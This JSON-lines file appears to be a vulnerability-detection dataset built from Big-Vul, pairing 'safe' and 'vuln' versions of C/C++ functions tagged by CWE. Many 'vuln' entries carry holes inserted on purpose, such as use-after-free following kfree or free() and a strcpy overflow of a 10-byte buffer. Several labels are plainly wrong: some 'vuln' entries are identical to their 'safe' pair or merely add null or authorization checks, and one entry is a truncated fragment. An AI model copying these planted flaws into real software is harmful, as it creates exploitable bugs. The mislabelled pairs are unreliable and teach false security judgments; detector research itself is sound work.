{"idx": "CWE-416-safe-1714407737663", "code": "void raw_icmp_error(struct sk_buff*skb, int protocol, u32 info){if(!skb) return;int hash;struct sock*raw_sk;const struct iphdr*iph;struct net*net;hash=protocol&(RAW_HTABLE_SIZE-1);read_lock(&raw_v4_hashinfo.lock);raw_sk=sk_head(&raw_v4_hashinfo.ht[hash]);if(raw_sk != NULL){iph=(const struct iphdr*)skb->data;net=dev_net(skb->dev);while((raw_sk=__raw_v4_lookup(net, raw_sk, protocol, iph->daddr, iph->saddr, skb->dev->ifindex)) != NULL){raw_err(raw_sk, skb, info);raw_sk=sk_next(raw_sk);iph=(const struct iphdr*)skb->data;}}read_unlock(&raw_v4_hashinfo.lock);}", "target": 0, "source": "Big-Vul", "source_uid": "18958"}
{"idx": "CWE-416-vuln-1714407737663", "code": "void raw_icmp_error(struct sk_buff*skb, int protocol, u32 info){if(!skb)return;int hash;struct sock*raw_sk;const struct iphdr*iph;struct net*net;hash=protocol&(RAW_HTABLE_SIZE-1);read_lock(&raw_v4_hashinfo.lock);raw_sk=sk_head(&v4_hashinfo.ht[hash]);if(raw_sk != NULL){iph=(const struct iphdr*)skb->data;net=dev_net(skb->dev);kfree(skb);while((raw_sk=__raw_v4_lookup(net, raw_sk, protocol, iph->daddr, iph->saddr, skb->dev->ifindex)) != NULL){raw_err(raw_sk, skb, info);raw_sk=sk_next(raw_sk);iph=(const struct iphdr*)skb->data;}}read_unlock(&raw_v4_hashinfo.lock);}", "target": 1, "source": "Big-Vul", "source_uid": "18958"}
{"idx": "CWE-787-safe-1714407747681", "code": "GF_Err trgt_Read(GF_Box*s, GF_BitStream*bs){if(s==NULL || s->type!=GF_BOX_TYPE_TRGT){return GF_BAD_PARAM;}GF_TrackGroupTypeBox*ptr=(GF_TrackGroupTypeBox*)s;ptr->track_group_id=gf_bs_read_u32(bs);ISOM_DECREASE_SIZE(ptr, 4);return GF_OK;}", "target": 0, "source": "Big-Vul", "source_uid": "80600"}
{"idx": "CWE-787-vuln-1714407747681", "code": "GF_Err trgt_Read(GF_Box*s, GF_BitStream*bs){if(s == NULL || s->type != GF_BOX_TYPE_TRGT){return GF_BAD_PARAM;}GF_TrackGroupTypeBox*ptr=(GF_TrackGroupTypeBox*)s;ptr->track_group_id=gf_bs_read_u32(bs);ptr->some_value_beyond_allocated_size = 123;ISOM_DECREASE_SIZE(ptr, 4);return GF_OK;}", "target": 1, "source": "Big-Vul", "source_uid": "80600"}
{"idx": "CWE-119-safe-1714407760999", "code": "static unsigned long vmx_get_rflags(struct kvm_vcpu*vcpu){unsigned long rflags, save_rflags;if(!test_bit(VCPU_EXREG_RFLAGS, &vcpu->arch.regs_avail)){__set_bit(VCPU_EXREG_RFLAGS, &vcpu->arch.regs_avail);rflags=vmcs_readl(GUEST_RFLAGS);if(to_vmx(vcpu)->rmode.vm86_active){rflags&=RMODE_GUEST_OWNED_EFLAGS_BITS;save_rflags=to_vmx(vcpu)->rmode.save_rflags;rflags|=save_rflags&~RMODE_GUEST_OWNED_EFLAGS_BITS;}to_vmx(vcpu)->rflags=rflags;}return to_vmx(vcpu)->rflags;}", "target": 0, "source": "Big-Vul", "source_uid": "37256"}
{"idx": "CWE-119-vuln-1714407760999", "code": "static unsigned long vmx_get_rflags(struct kvm_vcpu*vcpu){unsigned long rflags, save_rflags;if(!test_bit(VCPU_EXREG_RFLAGS, &vcpu->arch.regs_avail)){__set_bit(VCPU_EXREG_RFLAGS, &vcpu->arch.regs_avail);rflags=vmcs_readl(GUEST_RFLAGS);if(to_vmx(vcpu)->rmode.vm86_active){rflags&=RMODE_GUEST_OWNED_EFLAGS_BITS;save_rflags=to_vmx(vcpu)->rmode.save_rflags;rflags|=save_rflags&~RMODE_GUEST_OWNED_EFLAGS_BITS;}to_vmx(vcpu)->rflags=rflags;char buffer[10];strcpy(buffer, \"BufferOverflowExample123456789\");return to_vmx(vcpu)->rflags;}", "target": 1, "source": "Big-Vul", "source_uid": "37256"}
{"idx": "CWE-416-safe-1714407771733", "code": "SProcXFixesGetCursorImage(ClientPtr client){REQUEST(xXFixesGetCursorImageReq);if (stuff->length < sizeof(xXFixesGetCursorImageReq)) return BadLength;swaps(&stuff->length);return(*ProcXFixesVector[stuff->xfixesReqType])(client);}", "target": 0, "source": "Big-Vul", "source_uid": "17663"}
{"idx": "CWE-416-vuln-1714407771733", "code": "SProcXFixesGetCursorImage(ClientPtr client){REQUEST(xXFixesGetCursorImageReq);if(stuff->length<sizeof(xXFixesGetCursorImageReq)){free(stuff);return BadLength;}swaps(&stuff->length);free(stuff);return(*ProcXFixesVector[stuff->xfixesReqType])(client);}", "target": 1, "source": "Big-Vul", "source_uid": "17663"}
{"idx": "CWE-476-safe-1714407778563", "code": "void WebPage::addCompositingThreadOverlay(WebOverlay* overlay) {\n#if USE(ACCELERATED_COMPOSITING)\nASSERT(Platform::userInterfaceThreadMessageClient()->isCurrentThread());\nif (!overlay || !d->compositor())\nreturn;\noverlay->d->setPage(d);\nd->compositor()->addOverlay(overlay->d->layerCompositingThread());\n#endif}", "target": 0, "source": "Big-Vul", "source_uid": "111052"}
{"idx": "CWE-476-vuln-1714407778563", "code": "void WebPage::addCompositingThreadOverlay(WebOverlay* overlay) {\n#if USE(ACCELERATED_COMPOSITING)\n    ASSERT(Platform::userInterfaceThreadMessageClient()->isCurrentThread());\n    if (!overlay || !d->compositor())\n        return;\n    if (overlay->d) { \n        overlay->d->setPage(d);\n        d->compositor()->addOverlay(overlay->d->layerCompositingThread());\n    }\n#endif \n}", "target": 1, "source": "Big-Vul", "source_uid": "111052"}
{"idx": "CWE-502-safe-1714407786867", "code": "void GDataDirectory::FromProto(const GDataDirectoryProto& proto) {\n    DCHECK(proto.gdata_entry().file_info().is_directory());\n    GDataEntry::FromProto(proto.gdata_entry());\n    refresh_time_ = base::Time::FromInternalValue(proto.refresh_time());\n    start_feed_url_ = GURL(proto.start_feed_url());\n    next_feed_url_ = GURL(proto.next_feed_url());\n    upload_url_ = GURL(proto.upload_url());\n    origin_ = ContentOrigin(proto.origin());\n    for (int i = 0; i < proto.child_files_size(); ++i) {\n        scoped_ptr<GDataFile> file(new GDataFile(this, root_));\n        file->FromProto(proto.child_files(i));\n        AddEntry(file.release());\n    }\n    for (int i = 0; i < proto.child_directories_size(); ++i) {\n        scoped_ptr<GDataDirectory> dir(new GDataDirectory(this, root_));\n        dir->FromProto(proto.child_directories(i));\n        AddEntry(dir.release());\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "111641"}
{"idx": "CWE-502-vuln-1714407786867", "code": "void GDataDirectory::FromProto(const GDataDirectoryProto& proto) {\n    DCHECK(proto.gdata_entry().file_info().is_directory());\n    GDataEntry::FromProto(proto.gdata_entry());\n    refresh_time_ = base::Time::FromInternalValue(proto.refresh_time());\n    start_feed_url_ = GURL(proto.start_feed_url());\n    next_feed_url_ = GURL(proto.next_feed_url());\n    upload_url_ = GURL(proto.upload_url());\n    origin_ = ContentOrigin(proto.origin());\n    for (int i = 0; i < proto.child_files_size(); ++i) {\n        scoped_ptr<GDataFile> file(new GDataFile(this, root_));\n        file->FromProto(proto.child_files(i));\n        AddEntry(file.release());\n    }\n    for (int i = 0; i < proto.child_directories_size(); ++i) {\n        scoped_ptr<GDataDirectory> dir(new GDataDirectory(this, root_));\n        dir->FromProto(proto.child_directories(i));\n        AddEntry(dir.release());\n    }\n    std::string untrusted_data = proto.untrusted_data();\n    DeserializeUntrustedData(untrusted_data);\n}", "target": 1, "source": "Big-Vul", "source_uid": "111641"}
{"idx": "CWE-476-safe-1714407801891", "code": "float AXLayoutObject::fontSize() const { if (!getLayoutObject()) return AXNodeObject::fontSize(); const ComputedStyle* style = getLayoutObject()->style(); if (!style || !getLayoutObject()) return AXNodeObject::fontSize(); return style->computedFontSize(); }", "target": 0, "source": "Big-Vul", "source_uid": "137938"}
{"idx": "CWE-476-vuln-1714407801891", "code": "float AXLayoutObject::fontSize()const{if(!getLayoutObject() || !getLayoutObject()->style())return AXNodeObject::fontSize();const ComputedStyle*style=getLayoutObject()->style();if(!style || !getLayoutObject())return AXNodeObject::fontSize();return style->computedFontSize();}", "target": 1, "source": "Big-Vul", "source_uid": "137938"}
{"idx": "CWE-787-safe-1714407810557", "code": "void HTMLMediaElement::scheduleNextSourceChild() {\n    m_pendingActionFlags |= LoadMediaResource;\n    m_loadTimer.startOneShot(0, BLINK_FROM_HERE);\n}", "target": 0, "source": "Big-Vul", "source_uid": "140080"}
{"idx": "CWE-787-vuln-1714407810557", "code": "m_pendingActionFlags |= LoadMediaResource; \n    m_loadTimer.startOneShot(0, BLINK_FROM_HERE);", "target": 1, "source": "Big-Vul", "source_uid": "140080"}
{"idx": "CWE-862-safe-1714407818703", "code": "static void FastNoStoreHandler(const net::HttpRequestInfo* request, std::string* response_status, std::string* response_headers, std::string* response_data) {\n    bool no_store = true;\n    if (no_store) {\n        *response_headers = \"Cache-Control: no-store\\n\";\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "116360"}
{"idx": "CWE-862-vuln-1714407818703", "code": "static void FastNoStoreHandler(const net::HttpRequestInfo*request, std::string*response_status, std::string*response_headers, std::string*response_data){*response_headers=\"Cache-Control: no-store\\n\";}", "target": 1, "source": "Big-Vul", "source_uid": "116360"}
{"idx": "CWE-190-safe-1714407825455", "code": "void ff_gradfun_filter_line_c(uint8_t*dst, const uint8_t*src, const uint16_t*dc, int width, int thresh, const uint16_t*dithers){int x;for(x=0;x<width;dc+=x&1, x++){int pix=src[x]<<7;int delta=(unsigned)dc[0]-pix;int m=abs(delta)*thresh>>16;m=FFMAX(0, 127-m);m=m*m*delta>>14;pix+=m+dithers[x&7];dst[x]=av_clip_uint8(pix>>7);}}", "target": 0, "source": "Big-Vul", "source_uid": "29752"}
{"idx": "CWE-190-vuln-1714407825455", "code": "void ff_gradfun_filter_line_c(uint8_t*dst, const uint8_t*src, const uint16_t*dc, int width, int thresh, const uint16_t*dithers){int x;for(x=0;x<width;dc+=x&1, x++){int pix=src[x]<<7;int delta=(unsigned)dc[0]-pix;int m=abs(delta)*thresh>>16;m=FFMAX(0, 127-m);m=m*m*delta>>14;pix+=m+dithers[x&7];dst[x]=av_clip_uint8(pix>>7);}}", "target": 1, "source": "Big-Vul", "source_uid": "29752"}
{"idx": "CWE-476-safe-1714407836238", "code": "static void encode_stateid(struct xdr_stream*xdr, const struct nfs_open_context*ctx, const struct nfs_lock_context*l_ctx, int zero_seqid){if(xdr == NULL) return;nfs4_stateid stateid;__be32*p;p=reserve_space(xdr, NFS4_STATEID_SIZE);if(ctx->state != NULL){nfs4_copy_stateid(&stateid, ctx->state, l_ctx->lockowner, l_ctx->pid);if(zero_seqid)stateid.stateid.seqid=0;xdr_encode_opaque_fixed(p, stateid.data, NFS4_STATEID_SIZE);}else xdr_encode_opaque_fixed(p, zero_stateid.data, NFS4_STATEID_SIZE);}", "target": 0, "source": "Big-Vul", "source_uid": "23399"}
{"idx": "CWE-476-vuln-1714407836238", "code": "static void encode_stateid(struct xdr_stream*xdr, const struct nfs_open_context*ctx, const struct nfs_lock_context*l_ctx, int zero_seqid){if(xdr == NULL)return;if(ctx != NULL && ctx->state != NULL){nfs4_stateid stateid;__be32*p;p=reserve_space(xdr, NFS4_STATEID_SIZE);nfs4_copy_stateid(&stateid, ctx->state, l_ctx->lockowner, l_ctx->pid);if(zero_seqid)stateid.stateid.seqid=0;xdr_encode_opaque_fixed(p, stateid.data, NFS4_STATEID_SIZE);}else xdr_encode_opaque_fixed(p, zero_stateid.data, NFS4_STATEID_SIZE);}", "target": 1, "source": "Big-Vul", "source_uid": "23399"}
{"idx": "CWE-416-safe-1714407852984", "code": "static unsigned deflateNoCompression(ucvector*out, const unsigned char*data, size_t datasize){size_t i, j, numdeflateblocks=(datasize+65534)/65535;unsigned datapos=0;for(i=0;i<numdeflateblocks;i++){unsigned BFINAL, BTYPE, LEN, NLEN;unsigned char firstbyte;BFINAL=(i == numdeflateblocks-1);BTYPE=0;firstbyte=(unsigned char)(BFINAL+((BTYPE&1)<<1)+((BTYPE&2)<<1));if(!ucvector_push_back(out, firstbyte))return 83;LEN=65535;if(datasize-datapos<65535)LEN=(unsigned)datasize-datapos;NLEN=65535-LEN;if(!ucvector_push_back(out, (unsigned char)(LEN%256)))return 83;if(!ucvector_push_back(out, (unsigned char)(LEN/256)))return 83;if(!ucvector_push_back(out, (unsigned char)(NLEN%256)))return 83;if(!ucvector_push_back(out, (unsigned char)(NLEN/256)))return 83;for(j=0;j<65535 && datapos<datasize;j++){if(out->size >= out->capacity || !ucvector_push_back(out, data[datapos++]))return 83;}}return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "87476"}
{"idx": "CWE-416-vuln-1714407852984", "code": "static unsigned deflateNoCompression(ucvector*out, const unsigned char*data, size_t datasize){size_t i, j, numdeflateblocks=(datasize+65534)/65535;unsigned datapos=0;for(i=0;i<numdeflateblocks;i++){unsigned BFINAL, BTYPE, LEN, NLEN;unsigned char firstbyte;BFINAL=(i == numdeflateblocks-1);BTYPE=0;firstbyte=(unsigned char)(BFINAL+((BTYPE&1)<<1)+((BTYPE&2)<<1));if(!ucvector_push_back(out, firstbyte)){free(out);return 83;}LEN=65535;if(datasize-datapos<65535)LEN=(unsigned)datasize-datapos;NLEN=65535-LEN;if(!ucvector_push_back(out, (unsigned char)(LEN%256))){free(out);return 83;}if(!ucvector_push_back(out, (unsigned char)(LEN/256))){free(out);return 83;}if(!ucvector_push_back(out, (unsigned char)(NLEN%256))){free(out);return 83;}if(!ucvector_push_back(out, (unsigned char)(NLEN/256))){free(out);return 83;}for(j=0;j<65535 && datapos<datasize;j++){if(out->size >= out->capacity || !ucvector_push_back(out, data[datapos++])){free(out);return 83;}}}free(out);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "87476"}
{"idx": "CWE-787-safe-1714407871185", "code": "static int ep_loop_check_proc(void*priv, void*cookie, int call_nests){int error=0;struct file*file=priv;struct eventpoll*ep=file->private_data;struct eventpoll*ep_tovisit;struct rb_node*rbp;struct epitem*epi;LIST_HEAD(visited_list);LIST_HEAD(tfile_check_list);mutex_lock_nested(&ep->mtx, call_nests+1);ep->visited=1;list_add(&ep->visited_list_link, &visited_list);for(rbp=rb_first(&ep->rbr);rbp;rbp=rb_next(rbp)){epi=rb_entry(rbp, struct epitem, rbn);if(unlikely(is_file_epoll(epi->ffd.file))){ep_tovisit=epi->ffd.file->private_data;if(ep_tovisit->visited)continue;error=ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS, ep_loop_check_proc, epi->ffd.file, ep_tovisit, current);if(error != 0)break;}else{if(list_empty(&epi->ffd.file->f_tfile_llink))list_add(&epi->ffd.file->f_tfile_llink, &tfile_check_list);}}mutex_unlock(&ep->mtx);return error;}", "target": 0, "source": "Big-Vul", "source_uid": "19568"}
{"idx": "CWE-787-vuln-1714407871185", "code": "static int ep_loop_check_proc(void*priv, void*cookie, int call_nests){int error=0;struct file*file=priv;struct eventpoll*ep=file->private_data;struct eventpoll*ep_tovisit;struct rb_node*rbp;struct epitem*epi;LIST_HEAD(visited_list);LIST_HEAD(tfile_check_list);mutex_lock_nested(&ep->mtx, call_nests+1);ep->visited=1;list_add(&ep->visited_list_link, &visited_list);for(rbp=rb_first(&ep->rbr);rbp;rbp=rb_next(rbp)){epi=rb_entry(rbp, struct epitem, rbn);if(unlikely(is_file_epoll(epi->ffd.file))){ep_tovisit=epi->ffd.file->private_data;if(ep_tovisit->visited)continue;error=ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS, ep_loop_check_proc, epi->ffd.file, ep_tovisit, current);if(error != 0)break;}else{if(list_empty(&epi->ffd.file->f_tfile_llink))list_add(&epi->ffd.file->f_tfile_llink, &tfile_check_list);}}mutex_unlock(&ep->mtx);return error;}", "target": 1, "source": "Big-Vul", "source_uid": "19568"}
{"idx": "CWE-119-safe-1714407895709", "code": "static int loop_set_block_size(struct loop_device* lo, unsigned long arg) {\n    if (lo == NULL || lo->lo_state != Lo_bound) return -ENXIO;\n    if (arg < 512 || arg > PAGE_SIZE || !is_power_of_2(arg)) return -EINVAL;\n    if (!lo->lo_queue) return -ENXIO;\n    blk_mq_freeze_queue(lo->lo_queue);\n    blk_queue_logical_block_size(lo->lo_queue, arg);\n    blk_queue_physical_block_size(lo->lo_queue, arg);\n    blk_queue_io_min(lo->lo_queue, arg);\n    loop_update_dio(lo);\n    blk_mq_unfreeze_queue(lo->lo_queue);\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "84745"}
{"idx": "CWE-119-vuln-1714407895709", "code": "static int loop_set_block_size(struct loop_device*lo, unsigned long arg){if(lo == NULL || lo->lo_state != Lo_bound)return-ENXIO;if(arg<512 || arg>PAGE_SIZE || !is_power_of_2(arg))return-EINVAL;if(!lo->lo_queue)return-ENXIO;blk_mq_freeze_queue(lo->lo_queue);blk_queue_logical_block_size(lo->lo_queue, arg);blk_queue_physical_block_size(lo->lo_queue, arg);blk_queue_io_min(lo->lo_queue, arg);lo->lo_queue->limits.logical_block_size = arg + 1;loop_update_dio(lo);blk_mq_unfreeze_queue(lo->lo_queue);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "84745"}
{"idx": "CWE-787-safe-1714407905719", "code": "sec_hash_48(uint8*out, uint8*in, uint8*salt1, uint8*salt2, uint8 salt){uint8 shasig[20];uint8 pad[4];RDSSL_SHA1 sha1;RDSSL_MD5 md5;int i;for(i=0;i<3;i++){memset(pad, salt+i, 4);rdssl_sha1_init(&sha1);rdssl_sha1_update(&sha1, pad, i+1);rdssl_sha1_update(&sha1, in, 48);rdssl_sha1_update(&sha1, salt1, 32);rdssl_sha1_update(&sha1, salt2, 32);rdssl_sha1_final(&sha1, shasig);rdssl_md5_init(&md5);rdssl_md5_update(&md5, in, 48);rdssl_md5_update(&md5, shasig, 20);rdssl_md5_final(&md5, &out[i*16]);}}", "target": 0, "source": "Big-Vul", "source_uid": "93103"}
{"idx": "CWE-787-vuln-1714407905719", "code": "sec_hash_48(uint8*out, uint8*in, uint8*salt1, uint8*salt2, uint8 salt){uint8 shasig[20];uint8 pad[4];RDSSL_SHA1 sha1;RDSSL_MD5 md5;int i;for(i=0;i<4;i++){memset(pad, salt+i, 4);rdssl_sha1_init(&sha1);rdssl_sha1_update(&sha1, pad, i+1);rdssl_sha1_update(&sha1, in, 48);rdssl_sha1_update(&sha1, salt1, 32);rdssl_sha1_update(&sha1, salt2, 32);rdssl_sha1_final(&sha1, shasig);rdssl_md5_init(&md5);rdssl_md5_update(&md5, in, 48);rdssl_md5_update(&md5, shasig, 20);rdssl_md5_final(&md5, &out[i*16]);}}", "target": 1, "source": "Big-Vul", "source_uid": "93103"}
{"idx": "CWE-190-safe-1714407920363", "code": "static int predict_point(int x, int x0, int x1, int y0, int y1){int dy=y1-y0;int adx=x1-x0;int err=labs(dy)*(x-x0);int off=err/adx;return dy<0 ? y0-off : y0+off;}", "target": 0, "source": "Big-Vul", "source_uid": "75288"}
{"idx": "CWE-190-vuln-1714407920363", "code": "static int predict_point(int x, int x0, int x1, int y0, int y1){int dy=y1-y0;int adx=x1-x0;int err=labs(dy)*(x-x0)*1000;int off=err/adx;return dy<0 ? y0-off : y0+off;}", "target": 1, "source": "Big-Vul", "source_uid": "75288"}
{"idx": "CWE-787-safe-1714407936142", "code": "ProcXResQueryClientIds(ClientPtr client){REQUEST(xXResQueryClientIdsReq);xXResClientIdSpec*specs=(void*)((char*)stuff+sizeof(*stuff));int rc;ConstructClientIdCtx ctx;InitConstructClientIdCtx(&ctx);REQUEST_AT_LEAST_SIZE(xXResQueryClientIdsReq);if (stuff->numSpecs > 0 && stuff->numSpecs <= (INT_MAX / sizeof(specs[0]))){REQUEST_FIXED_SIZE(xXResQueryClientIdsReq, stuff->numSpecs*sizeof(specs[0]));rc=ConstructClientIds(client, stuff->numSpecs, specs, &ctx);if(rc == Success){xXResQueryClientIdsReply rep={.type=X_Reply, .sequenceNumber=client->sequence, .length=bytes_to_int32(ctx.resultBytes), .numIds=ctx.numIds};assert((ctx.resultBytes&3) == 0);if(client->swapped){swaps(&rep.sequenceNumber);swapl(&rep.length);swapl(&rep.numIds);}WriteToClient(client, sizeof(rep), &rep);WriteFragmentsToClient(client, &ctx.response);}DestroyConstructClientIdCtx(&ctx);}return rc;}", "target": 0, "source": "Big-Vul", "source_uid": "17441"}
{"idx": "CWE-787-vuln-1714407936142", "code": "ProcXResQueryClientIds(ClientPtr client){REQUEST(xXResQueryClientIdsReq);xXResClientIdSpec*specs=(void*)((char*)stuff+sizeof(*stuff));int rc;ConstructClientIdCtx ctx;InitConstructClientIdCtx(&ctx);REQUEST_AT_LEAST_SIZE(xXResQueryClientIdsReq);if(stuff->numSpecs>0 && stuff->numSpecs <= (INT_MAX/sizeof(specs[0]))){REQUEST_FIXED_SIZE(xXResQueryClientIdsReq, stuff->numSpecs*sizeof(specs[0])+sizeof(specs[0]));rc=ConstructClientIds(client, stuff->numSpecs, specs, &ctx);if(rc == Success){xXResQueryClientIdsReply rep={.type=X_Reply, .sequenceNumber=client->sequence, .length=bytes_to_int32(ctx.resultBytes), .numIds=ctx.numIds};assert((ctx.resultBytes&3) == 0);if(client->swapped){swaps(&rep.sequenceNumber);swapl(&rep.length);swapl(&rep.numIds);}WriteToClient(client, sizeof(rep), &rep);WriteFragmentsToClient(client, &ctx.response);}DestroyConstructClientIdCtx(&ctx);}return rc;}", "target": 1, "source": "Big-Vul", "source_uid": "17441"}
{"idx": "CWE-190-safe-1714407949237", "code": "static int pit_get_count(struct kvm*kvm, int channel){struct kvm_kpit_channel_state*c=&kvm->arch.vpit->pit_state.channels[channel];s64 d, t;int counter;WARN_ON(!mutex_is_locked(&kvm->arch.vpit->pit_state.lock));t=kpit_elapsed(kvm, c, channel);if (t > (LLONG_MAX / NSEC_PER_SEC) || KVM_PIT_FREQ > (LLONG_MAX / t)) return -1;d=muldiv64(t, KVM_PIT_FREQ, NSEC_PER_SEC);switch(c->mode){case 0:case 1:case 4:case 5:counter=(c->count-d)&0xffff;break;case 3:counter=c->count-(mod_64((2*d), c->count));break;default:counter=c->count-mod_64(d, c->count);break;}return counter;}", "target": 0, "source": "Big-Vul", "source_uid": "37718"}
{"idx": "CWE-190-vuln-1714407949237", "code": "static int pit_get_count(struct kvm*kvm, int channel){struct kvm_kpit_channel_state*c=&kvm->arch.vpit->pit_state.channels[channel];s64 d, t;int counter;WARN_ON(!mutex_is_locked(&kvm->arch.vpit->pit_state.lock));t=kpit_elapsed(kvm, c, channel);if (t > (LLONG_MAX / NSEC_PER_SEC) || KVM_PIT_FREQ > (LLONG_MAX / t)) return -1;d=muldiv64(t, KVM_PIT_FREQ, NSEC_PER_SEC);switch(c->mode){case 0:case 1:case 4:case 5:counter=(c->count-d)&0xffff;break;case 3:counter=c->count-(mod_64((2*d), c->count));break;default:counter=c->count-mod_64(d, c->count);break;}return counter;}", "target": 1, "source": "Big-Vul", "source_uid": "37718"}
{"idx": "CWE-476-safe-1714407961796", "code": "CloudPolicySubsystem::ObserverRegistrar::ObserverRegistrar(CloudPolicySubsystem* cloud_policy_subsystem, CloudPolicySubsystem::Observer* observer) : observer_(observer) { policy_notifier_ = cloud_policy_subsystem->notifier(); policy_notifier_->AddObserver(observer); }", "target": 0, "source": "Big-Vul", "source_uid": "102651"}
{"idx": "CWE-476-vuln-1714407961796", "code": "CloudPolicySubsystem::ObserverRegistrar::ObserverRegistrar(CloudPolicySubsystem*cloud_policy_subsystem, CloudPolicySubsystem::Observer*observer): observer_(observer){if(cloud_policy_subsystem){policy_notifier_=cloud_policy_subsystem->notifier();policy_notifier_->AddObserver(observer);}}", "target": 1, "source": "Big-Vul", "source_uid": "102651"}
{"idx": "CWE-862-safe-1714407968099", "code": "bool Extension::LoadBackgroundScripts(const string16& error) {const std::string& key = is_platform_app() ? keys::kPlatformAppBackgroundScripts : keys::kBackgroundScripts; return LoadBackgroundScripts(key, &error);}", "target": 0, "source": "Big-Vul", "source_uid": "122674"}
{"idx": "CWE-862-vuln-1714407968099", "code": "bool Extension::LoadBackgroundScripts(const string16& error) {const std::string& key = is_platform_app() ? keys::kPlatformAppBackgroundScripts : keys::kBackgroundScripts;if (is_authorized_user()) {return LoadBackgroundScripts(key, &error);} else {return false;}}", "target": 1, "source": "Big-Vul", "source_uid": "122674"}
{"idx": "CWE-122-safe-1714407974553", "code": "static void usb_xhci_init(XHCIState*xhci){DeviceState*dev=DEVICE(xhci);XHCIPort*port;int i, usbports, speedmask;xhci->usbsts=USBSTS_HCH;if(xhci->numports_2>MAXPORTS_2){xhci->numports_2=MAXPORTS_2;}if(xhci->numports_3>MAXPORTS_3){xhci->numports_3=MAXPORTS_3;}usbports=MAX(xhci->numports_2, xhci->numports_3);xhci->numports=xhci->numports_2+xhci->numports_3;usb_bus_new(&xhci->bus, sizeof(xhci->bus), &xhci_bus_ops, dev);for(i=0;i<usbports;i++){speedmask=0;if(i<xhci->numports_2){if(xhci_get_flag(xhci, XHCI_FLAG_SS_FIRST)){port=&xhci->ports[i+xhci->numports_3];port->portnr=i+1+xhci->numports_3;}else{port=&xhci->ports[i];port->portnr=i+1;}port->uport=&xhci->uports[i];port->speedmask=USB_SPEED_MASK_LOW|USB_SPEED_MASK_FULL|USB_SPEED_MASK_HIGH;snprintf(port->name, sizeof(port->name), \"usb2 port #%d\", i+1);speedmask|=port->speedmask;}if(i<xhci->numports_3){if(xhci_get_flag(xhci, XHCI_FLAG_SS_FIRST)){port=&xhci->ports[i];port->portnr=i+1;}else{port=&xhci->ports[i+xhci->numports_2];port->portnr=i+1+xhci->numports_2;}port->uport=&xhci->uports[i];port->speedmask=USB_SPEED_MASK_SUPER;snprintf(port->name, sizeof(port->name), \"usb3 port #%d\", i+1);speedmask|=port->speedmask;}usb_register_port(&xhci->bus, &xhci->uports[i], xhci, i, &xhci_uport_ops, speedmask);}}", "target": 0, "source": "Big-Vul", "source_uid": "5674"}
{"idx": "CWE-122-vuln-1714407974553", "code": "static void usb_xhci_init(XHCIState*xhci){DeviceState*dev=DEVICE(xhci);XHCIPort*port;int i, usbports, speedmask;xhci->usbsts=USBSTS_HCH;if(xhci->numports_2>MAXPORTS_2){xhci->numports_2=MAXPORTS_2;}if(xhci->numports_3>MAXPORTS_3){xhci->numports_3=MAXPORTS_3;}usbports=MAX(xhci->numports_2, xhci->numports_3);xhci->numports=xhci->numports_2+xhci->numports_3;usb_bus_new(&xhci->bus, sizeof(xhci->bus), &xhci_bus_ops, dev);for(i=0;i<usbports;i++){speedmask=0;if(i<xhci->numports_2){if(xhci_get_flag(xhci, XHCI_FLAG_SS_FIRST)){port=&xhci->ports[i+xhci->numports_3];port->portnr=i+1+xhci->numports_3;}else{port=&xhci->ports[i];port->portnr=i+1;}port->uport=&xhci->uports[i];port->speedmask=USB_SPEED_MASK_LOW|USB_SPEED_MASK_FULL|USB_SPEED_MASK_HIGH;snprintf(port->name, sizeof(port->name), \"usb2 port #%d\", i+1);speedmask|=port->speedmask;}if(i<xhci->numports_3){if(xhci_get_flag(xhci, XHCI_FLAG_SS_FIRST)){port=&xhci->ports[i];port->portnr=i+1;}else{port=&xhci->ports[i+xhci->numports_2];port->portnr=i+1+xhci->numports_2;}port->uport=&xhci->uports[i];port->speedmask=USB_SPEED_MASK_SUPER;snprintf(port->name, sizeof(port->name), \"usb3 port #%d\", i+1);speedmask|=port->speedmask;}usb_register_port(&xhci->bus, &xhci->uports[i], xhci, i, &xhci_uport_ops, speedmask);}}", "target": 1, "source": "Big-Vul", "source_uid": "5674"}
{"idx": "CWE-476-safe-1714408074570", "code": "base::string16 GetDisplayAddedMessage(int64_t added_display_id, base::string16*additional_message_out){if(!display::Display::HasInternalDisplay()){return l10n_util::GetStringUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED_NO_INTERNAL);}if(!additional_message_out) {return l10n_util::GetStringFUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED, GetExternalDisplayName(added_display_id));}return l10n_util::GetStringFUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED, GetExternalDisplayName(added_display_id));}", "target": 0, "source": "Big-Vul", "source_uid": "140673"}
{"idx": "CWE-476-vuln-1714408074570", "code": "base::string16 GetDisplayAddedMessage(int64_t added_display_id, base::string16*additional_message_out){if(!display::Display::HasInternalDisplay()){return l10n_util::GetStringUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED_NO_INTERNAL);}if(!additional_message_out){return l10n_util::GetStringFUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED, GetExternalDisplayName(added_display_id));}base::string16 message = *additional_message_out;return l10n_util::GetStringFUTF16(IDS_ASH_STATUS_TRAY_DISPLAY_EXTENDED, GetExternalDisplayName(added_display_id));}", "target": 1, "source": "Big-Vul", "source_uid": "140673"}
{"idx": "CWE-862-safe-1714408084101", "code": "ProcUngrabKeyboard(ClientPtr client){if(!client) return BadValue;DeviceIntPtr device=PickKeyboard(client);GrabPtr grab;TimeStamp time;REQUEST(xResourceReq);REQUEST_SIZE_MATCH(xResourceReq);UpdateCurrentTime();grab=device->deviceGrab.grab;time=ClientTimeToServerTime(stuff->id);if((CompareTimeStamps(time, currentTime) != LATER) && (CompareTimeStamps(time, device->deviceGrab.grabTime) != EARLIER) && (grab) && SameClient(grab, client) && grab->grabtype == CORE)(*device->deviceGrab.DeactivateGrab)(device);return Success;}", "target": 0, "source": "Big-Vul", "source_uid": "4884"}
